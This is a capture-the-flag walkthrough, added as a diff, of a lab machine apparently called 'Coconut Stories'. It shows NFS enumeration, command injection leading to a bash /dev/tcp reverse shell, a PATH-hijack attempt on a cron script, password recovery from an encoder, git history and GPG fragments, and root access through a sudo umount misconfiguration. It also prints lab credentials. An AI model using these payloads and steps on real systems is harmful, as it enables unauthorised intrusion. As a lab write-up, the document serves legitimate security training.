@@ -1,0 +1,525 @@
+Coconut Stories
+
+NMAP RESULTS:
+
+
+PORT      STATE SERVICE  REASON  VERSION
+22/tcp    open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbRN8GvRSpA+ku5hqrPnyaobOvwYc4jddRGBHo91dNlIjNdX4LIRLCLdJkpMlW64MVwHV8QIjTFNxPqLQvOkbIn3yX+MQByFziSNf7h5+/tqrXDwZDMMqFAmZ7yeXoopcRY1cfumkYUHbjRxdrNj8Hpd8ol6xnIo9y+qiZx1HPpY3P9HsRpZ6XBq0bE3J68gBozFQmXa8gIU5aX+l0PHOdctWRo4vXa/oQteObsn9Rx+69WpatoDx1TdP4T3fGa3f1dMFIohCzlTUPJgzyGuRZq6JjaBvItUIGPg+isvkg7+diSLDCIo/U7vixeJNLrnvETMnRlwn0jOKxUFrtIwB7
+|   256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNz3AD3vWNpd2P1sXPm9tHrr6RQjBiCsXT0U/6euW2oK1RqQvipuiKTlcpNRRsXOxcIpscn+7M3nwW5Cgq0ipiA=
+|   256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAv5Jlh5/zgLa5D73WCXKa44htAWA67kUp4x5pGWgXri
+111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      38641/udp6  mountd
+|   100005  1,2,3      39139/udp   mountd
+|   100005  1,2,3      40579/tcp   mountd
+|   100005  1,2,3      51777/tcp6  mountd
+|   100021  1,3,4      34477/udp6  nlockmgr
+|   100021  1,3,4      36391/tcp   nlockmgr
+|   100021  1,3,4      40603/tcp6  nlockmgr
+|   100021  1,3,4      47762/udp   nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+2049/tcp  open  nfs_acl  syn-ack 3 (RPC #100227)
+8080/tcp  open  http     syn-ack Werkzeug httpd 0.14.1 (Python 3.6.9)
+| http-methods: 
+|_  Supported Methods: HEAD GET OPTIONS
+|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
+|_http-title: CCHQ
+36391/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
+40579/tcp open  mountd   syn-ack 1-3 (RPC #100005)
+48039/tcp open  mountd   syn-ack 1-3 (RPC #100005)
+50119/tcp open  mountd   syn-ack 1-3 (RPC #100005)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+WE GOT NFS DRIVE, LETS ENUMERATE IT:
+└─$ showmount -e 10.10.225.65                                        
+Export list for 10.10.225.65:
+/var/nfs/general *
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ mkdir /tmp/mount                 
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ sudo mount -t nfs 10.10.225.65:/var/nfs/general /tmp/mount -nolock
+[sudo] password for kali: 
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ cd /tmp/mount  
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/mount]
+└─$ ls    
+credentials.bak
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/mount]
+└─$ file credentials.bak 
+credentials.bak: ASCII text
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/mount]
+└─$ cat credentials.bak 
+paradoxial.test
+ShibaPretzel79
+                    
+
+AFTER GETTING THESE CREDS, I CHECK THE PORT 8080 FOR FURTHER ENUMERATION
+USING GOBUSTER ON THE PORT 8080:
+
+===============================================================
+2021/04/15 02:06:33 Starting gobuster
+===============================================================
+/login (Status: 200)
+/cat (Status: 302)
+
+
+I TREID THE CREDS WE GOT EARLIEAR IN THE LOGIN PAGE, AND THESE CREDS WORKS!!
+AFTER LOGIN I GOT DIRECTED TO THE /cat DIRECTORY, THIS PAGE IS SAYING THAT:
+
+Welcome Cooctus Recruit!
+
+Here, you can test your exploits in a safe environment before launching them against your target. Please bear in mind, some functionality is still under development in the current version.
+
+
+AS I TYPE SOMETHING THE PAYLOAD BOX AND PRESS ENTER, IT JUST 'CAT' OUT THAT WORD(AND THE NAME OF THE DIRECTORY IS ALSO cat)
+LETS CHECK HOW TO BYPASS IT
+
+
+WE I TRIED TO PING ME BACK BY TYPING 'ping -c 1 <ip>' AND THEN CHECKING THE RESULT ON tcpdump:
+┌──(kali㉿kali)-[~]
+└─$ sudo tcpdump -i tun0 icmp
+[sudo] password for kali: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+02:13:45.503364 IP 10.10.225.65 > 10.8.73.218: ICMP echo request, id 1143, seq 1, length 64
+02:13:45.503501 IP 10.8.73.218 > 10.10.225.65: ICMP echo reply, id 1143, seq 1, length 64
+
+
+YES WE GOT CODE EXECUTION!!
+
+
+LETS TRY TO GET A REVERSE SHELL
+
+USING THE PAYLOAD:
+
+bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.225.65] 33156
+bash: cannot set terminal process group (718): Inappropriate ioctl for device
+bash: no job control in this shell
+paradox@cchq:~$ 
+
+
+GOT THE REVERSE SHELL:
+LETS STABILIZE IT
+
+
+GOT THE FIRST FLAG
+
+
+THEN IN THE SZYMEX DIRECTORY:
+
+paradox@cchq:/home/szymex$ cat note_to_para 
+Paradox,
+
+I'm testing my new Dr. Pepper Tracker script. 
+It detects the location of shipments in real time and sends the coordinates to your account.
+If you find this annoying you need to change my super secret password file to disable the tracker.
+
+You know me, so you know how to get access to the file.
+
+- Szymex
+paradox@cchq:/home/szymex$ 
+
+AFTER CHECKING THE CRONTABS:
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* * 	* * * 	szymex	/home/szymex/SniffingCat.py
+#
+
+
+THIS FILE NAME SniffingCat.py RUNS IN EVERY MINUTE:
+===========================================================
+paradox@cchq:/home/szymex$ cat SniffingCat.py 
+#!/usr/bin/python3
+import os
+import random
+
+def encode(pwd):
+    enc = ''
+    for i in pwd:
+        if ord(i) > 110:
+            num = (13 - (122 - ord(i))) + 96
+            enc += chr(num)
+        else:
+            enc += chr(ord(i) + 13)
+    return enc
+
+
+x = random.randint(300,700)
+y = random.randint(0,255)
+z = random.randint(0,1000)
+
+message = "Approximate location of an upcoming Dr.Pepper shipment found:"
+coords = "Coordinates: X: {x}, Y: {y}, Z: {z}".format(x=x, y=y, z=z)
+
+with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
+    line = f.readline().rstrip("\n")
+    enc_pw = encode(line)
+    if enc_pw == "pureelpbxr":
+        os.system("wall -g paradox " + message)
+        os.system("wall -g paradox " + coords)
+
+==========================================================
+
+The command 'wall' is running without the relative path which can be exploited
+so i made a file name 'wall' in the /tmp directory, add a reverse shell in it; make it executable then change the path to the /tmp directory
+and then on my machine using netcat
+
+BUT THIS DOES'NT WORK!!
+
+maybe i have to make a script which can reverse this process?
+
+=============================================================
+#!/usr/bin/python3
+import os
+import random
+
+def encode(pwd):
+    enc = ''
+    for i in pwd:
+        if ord(i) > 110:
+            num = (13 - (122 - ord(i))) + 96
+            enc += chr(num)
+        else:
+            enc += chr(ord(i) + 13)
+    return enc
+
+alpha = 'abcdefghijklmnopqrstuvwxyz'
+password = ''
+cipher = 'pureelpbxr'
+
+for i in alpha:
+    for j in cipher:
+       tmp = encode(i)
+       if tmp == j:
+           password += i 
+print(password)
+
+============================================
+
+┌──(kali㉿kali)-[~/coconit]
+└─$ python3 code.py
+cherrycoke
+
+
+
+LETS TRY TO GET TO THE SZYMEX ACCOUNT
+
+FIRST ACCORDING TO THE ROOM , I CREATED A SSH KEY PAIR AND SSH INTO THE PARADOX ACCOUNT 
+
+YES WE ARE IN!!
+GOT THE SECOND FLAG
+
+NOW ITS TIME FOT TUX ACCOUNT:
+=======================================
+szymex@cchq:/home/tux$ cat note_to_every_cooctus 
+Hello fellow Cooctus Clan members
+
+I'm proposing my idea to dedicate a portion of the cooctus fund for the construction of a penguin army.
+
+The 1st Tuxling Infantry will provide young and brave penguins with opportunities to
+explore the world while making sure our control over every continent spreads accordingly.
+
+Potential candidates will be chosen from a select few who successfully complete all 3 Tuxling Trials.
+Work on the challenges is already underway thanks to the trio of my top-most explorers.
+
+Required budget: 2,348,123 Doge coins and 47 pennies.
+
+Hope this message finds all of you well and spiky.
+
+- TuxTheXplorer
+============================================
+
+
+WE HAVE TWO DIRECTORIES NAMES 'tuxling_1' AND 'tuxling_3'
+
+
+CHECK THE CONTENTS OF 'tuxling_1':
+==================================================
+szymex@cchq:/home/tux/tuxling_1$ cat nootcode.c 
+#include <stdio.h>
+
+#define noot int
+#define Noot main
+#define nOot return
+#define noOt (
+#define nooT )
+#define NOOOT "f96"
+#define NooT ;
+#define Nooot nuut
+#define NOot {
+#define nooot key
+#define NoOt }
+#define NOOt void
+#define NOOT "NOOT!\n"
+#define nooOT "050a"
+#define noOT printf
+#define nOOT 0
+#define nOoOoT "What does the penguin say?\n"
+#define nout "d61"
+
+noot Noot noOt nooT NOot
+    noOT noOt nOoOoT nooT NooT
+    Nooot noOt nooT NooT
+
+    nOot nOOT NooT
+NoOt
+
+NOOt nooot noOt nooT NOot
+    noOT noOt NOOOT nooOT nout nooT NooT
+NoOt
+
+NOOt Nooot noOt nooT NOot
+    noOT noOt NOOT nooT NooT
+NoOt
+szymex@cchq:/home/tux/tuxling_1$ 
+
+
+szymex@cchq:/home/tux/tuxling_1$ cat note 
+Noot noot! You found me. 
+I'm Mr. Skipper and this is my challenge for you.
+
+General Tux has bestowed the first fragment of his secret key to me.
+If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.
+
+Good luck and keep on nooting!
+
+PS: You can compile the source code with gcc
+szymex@cchq:/home/tux/tuxling_1$ 
+
+=========================================================
+
+
+WHEN I DECODE THE C CODE:
+===============================
+int main () {
+    printf("What does the penguin say?\n");
+    nuut()  
+    return 0 ;
+}
+
+void key () {
+    printf("f96050ad61");
+}
+
+void nuut() {
+    printf("NOOT!\n");
+}
+=============================
+WE HAVE THE FIRST PART OF THE SECRET KEY
+LETS CHECK THE DIRECTORY 'tuxling_3':
+
+============================================
+szymex@cchq:/home/tux/tuxling_3$ cat note 
+Hi! Kowalski here. 
+I was practicing my act of disappearance so good job finding me.
+
+Here take this,
+The last fragment is: 637b56db1552
+
+Combine them all and visit the station.
+szymex@cchq:/home/tux/tuxling_3$ 
+=============================================
+
+WE GOT THE THIRD PART
+BUT WHERE IS THE SECOND PART???
+
+szymex@cchq:/home/tux$ find / -type d -name "tuxling_2" 2>/dev/null
+/media/tuxling_2
+
+
+GOT IT!!
+========================
+szymex@cchq:/media/tuxling_2$ ls -la
+total 20
+drwxrwx--- 2 tux  testers 4096 Feb 20 20:02 .
+drwxr-xr-x 3 root root    4096 Feb 20 21:04 ..
+-rw-rw-r-- 1 tux  testers  740 Feb 20 20:00 fragment.asc
+-rw-rw---- 1 tux  testers  280 Jan  2 20:20 note
+-rw-rw-r-- 1 tux  testers 3670 Feb 20 20:01 private.key
+szymex@cchq:/media/tuxling_2$ cat note 
+Noot noot! You found me. 
+I'm Rico and this is my challenge for you.
+General Tux handed me a fragment of his secret key for safekeeping.
+I've encrypted it with Penguin Grade Protection (PGP).
+You can have the key fragment if you can decrypt it.
+Good luck and keep on nooting!
+
+szymex@cchq:/media/tuxling_2$ 
+===================================================
+
+FIRST IMPORT THE PRIVATE KEY:
+
+szymex@cchq:/media/tuxling_2$ gpg --import private.key 
+gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
+gpg: key B70EB31F8EF3187C: secret key imported
+gpg: Total number processed: 1
+gpg:               imported: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+
+THEN DECRYPT THE FILE:
+szymex@cchq:/media/tuxling_2$ gpg -d fragment.asc 
+gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
+      "TuxPingu"
+The second key fragment is: 6eaf62818d
+
+
+
+WE GOT ALL THREE CODES, LETS COMBINE THEM:
+f96050ad616eaf62818d637b56db1552
+
+I THINK THIS IS A MD5 HASH
+
+
+CRACKING IT USING THE TOOL ON HASHES.ORG:
+f96050ad616eaf62818d637b56db1552:tuxykitty
+
+
+LETS GET TO TUX!!
+
+GOT THE THIRD FLAG
+
+NOW ITS TIME FOR VARG:
+
+NOW WE CAN ACCESS THE DIRECTORY IN THE /opt FOLDER AS WE HAVE GROUP PERMISSIONS:
+tux@cchq:/home/varg$ id
+uid=1000(tux) gid=1000(tux) groups=1000(tux),1004(testers),1005(os_tester)
+tux@cchq:/home/varg$ ls -la /opt/
+total 12
+drwxr-xr-x  3 root root      4096 Feb 20 14:30 .
+drwxr-xr-x 24 root root      4096 Feb 20 21:04 ..
+drwxrwx--- 11 varg os_tester 4096 Feb 20 15:44 CooctFS
+
+
+I FOUND A GIT REPO IN THE 'cooctOS_src' DIRECTORY
+CHECKING THE GIT LOGS AND CHANGES MADE IN THE REPO I FOUND SOMETHING JUICY:
+===================================================
+-print("CooctOS 13.3.7 LTS cookie tty1")
+-uname = input("\ncookie login: ")
+-pw = input("Password: ")
+-
+-for i in range(0,2):
+-    if pw != "slowroastpork":
+-        pw = input("Password: ")
+-    else:
+-        if uname == "varg":
+-            os.setuid(1002)
+-            os.setgid(1002)
+-            pty.spawn("/bin/rbash")
+-            break
+-        else:
+-            print("Login Failed")
+-            break
+
+===================================================
+
+I CHECK THE PASSWORD FOR VARG AND IT CORRECT!!!
+
+GOT THE FOURTH FLAG
+
+CHECKING THE SUDOERS FILE:
+varg@cchq:/opt/CooctFS$ sudo -l
+Matching Defaults entries for varg on cchq:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User varg may run the following commands on cchq:
+    (root) NOPASSWD: /bin/umount
+varg@cchq:/opt/CooctFS$ 
+
+CHECKING THE MOUNT SHARES:
+/dev/mapper/ubuntu--vg-ubuntu--lv   19G  6.6G   12G  38% /opt/CooctFS
+/dev/xvda2                         976M  146M  764M  16% /boot
+tmpfs                               99M     0   99M   0% /run/user/1003
+binfmt_misc                           0     0     0    - /proc/sys/fs/binfmt_misc
+tmpfs                               99M     0   99M   0% /run/user/1002
+
+
+WE CAN SEE THAT /dev/mapper/ubuntu--vg-ubuntu--lv IS MOUNTED TO /opt/CooctFS
+LETS UNMOUNT THIS AND SEE WHAT HAPPENS
+
+WE GOT A ROOT DIRECTORY:
+varg@cchq:/opt/CooctFS/root$ ls -la
+total 28
+drwxr-xr-x 5 root root 4096 Feb 20 09:16 .
+drwxr-xr-x 3 root root 4096 Feb 20 09:09 ..
+lrwxrwxrwx 1 root root    9 Feb 20 09:15 .bash_history -> /dev/null
+-rw-r--r-- 1 root root 3106 Feb 20 09:09 .bashrc
+drwx------ 3 root root 4096 Feb 20 09:09 .cache
+drwxr-xr-x 3 root root 4096 Feb 20 09:09 .local
+-rw-r--r-- 1 root root   43 Feb 20 09:16 root.txt
+drwxr-xr-x 2 root root 4096 Feb 20 09:41 .ssh
+varg@cchq:/opt/CooctFS/root$ cat root.txt 
+hmmm...
+No flag here. You aren't root yet.
+
+
+WE GOT A .SSH DIRECTORY AND A PRIVATE KEY:
+
+┌──(kali㉿kali)-[~/coconit]
+└─$ ssh -i root_id_rsa root@10.10.102.32                   
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Apr 18 04:41:46 UTC 2021
+
+  System load:  0.12               Processes:           120
+  Usage of /:   35.4% of 18.57GB   Users logged in:     1
+  Memory usage: 23%                IP address for eth0: 10.10.102.32
+  Swap usage:   0%
+
+
+0 packages can be updated.
+0 of these updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Feb 20 22:22:12 2021 from 172.16.228.162
+root@cchq:~# 
+
+GOT A ROOT SHELLL
+GOT THE ROOT FLAG
+
+
+
